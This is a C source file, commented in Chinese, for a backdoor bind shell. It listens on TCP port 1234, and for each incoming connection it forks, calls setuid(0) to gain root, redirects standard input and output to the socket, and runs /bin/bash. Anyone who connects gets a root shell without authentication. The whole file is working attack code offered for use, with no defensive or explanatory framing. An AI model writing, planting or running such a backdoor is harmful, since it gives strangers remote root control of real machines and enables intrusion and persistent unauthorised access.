/**
 * @author 谢 方奎
 * @email xiefangkui@outlook.com
 * @create date 2017-11-03 04:28:34
 * @modify date 2017-11-03 04:28:34
 * @desc [description]
*/
#include <stdio.h>
#include <strings.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 1234 // 端口号
#define BACKLOG 1 // 请求队列中的最大连接数

void create_shell();
void socket_server();

void socket_server()
{
    // 创建tcp套接字
    int listenfd = socket(AF_INET, SOCK_STREAM, 0);
    if (listenfd == -1)
    {
        fprintf(stderr, "create socket fail!\n");
        exit(1);
    }

    struct sockaddr_in server, client; // 服务端，客户端地址
    // 初始化server套接字地址结构
    bzero(&server, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = htonl(INADDR_ANY);

    //套接字与指定地址绑定
    if (bind(listenfd, (struct sockaddr *)&server, sizeof(server)) == -1)
    {
        fprintf(stderr, "Bind error\n");
        exit(1);
    }

    // 打开套接字帧听
    if (listen(listenfd, BACKLOG) == -1)
    {
        fprintf(stderr, "Listen error\n");
        exit(1);
    }

    socklen_t addrlen = sizeof(client);

    // 监听套接字请求
    int connectfd;
    while (1)
    {
        if ((connectfd = accept(listenfd, (struct sockaddr *)&client, &addrlen)) == -1)
        {
            fprintf(stderr, "Accept error\n");
            break;
        }
        printf("You got a connection from client's IP is %s, port is %d\n",
               inet_ntoa(client.sin_addr), ntohs(client.sin_port));
        send(connectfd, "Welcome\n", 8, 0);
        create_shell(connectfd);
        // close(connectfd);
    }
    close(listenfd);
    return;
}

void create_shell(int connectfd)
{
    pid_t pid = fork();
    if(pid < 0) return;
    if(pid > 0) exit(0);
    if (setuid(0) < 0)
    {
        printf("seteuid error!\n");
        exit(1);
    }
    printf("real id is %d. effective id is %d.\n", getuid(), geteuid());
    dup2(connectfd,0);               /*将标准输入、输出、出错重定向到我们的套接字上*/
    dup2(connectfd,1);               /*实质是套接字的复制*/
    dup2(connectfd,2);
    execlp("/bin/bash", "/bin/bash", NULL);
}
int main(int argc, char const *argv[])
{
    socket_server();
    return 0;
}